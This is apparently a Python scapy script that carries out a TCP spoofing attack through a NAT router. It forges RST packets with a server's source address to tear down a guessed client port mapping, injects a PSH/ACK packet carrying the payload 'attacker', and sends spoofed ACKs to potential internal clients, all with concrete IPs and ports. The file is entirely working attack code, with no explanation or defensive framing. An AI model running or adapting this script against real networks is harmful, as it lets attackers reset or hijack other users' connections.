
import struct
from tabnanny import verbose
import threading
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

server_ip = '101.43.138.36'
server_port = 5902
guess_client_port_right = 55130

my_ip = "192.168.5.2"
router_wan_ip = "172.20.12.240"


send(IP(src=server_ip,dst=router_wan_ip)/TCP(seq=1, sport=server_port, dport=guess_client_port_right,flags="R"))
time.sleep(10)
send(IP(src=my_ip,dst=server_ip)/TCP(seq=1, ack=1, sport=guess_client_port_right, dport=server_port,flags="PA")/"attacker")
time.sleep(1)
send(IP(src=server_ip,dst=router_wan_ip)/TCP(seq=1, sport=server_port, dport=guess_client_port_right,flags="R"))
time.sleep(10)
potential_clients = ["192.168.5.4"]
for client in potential_clients:
    send(IP(src=server_ip,dst=client)/TCP(seq=1, ack=1, sport=server_port, dport=guess_client_port_right,flags="A"))


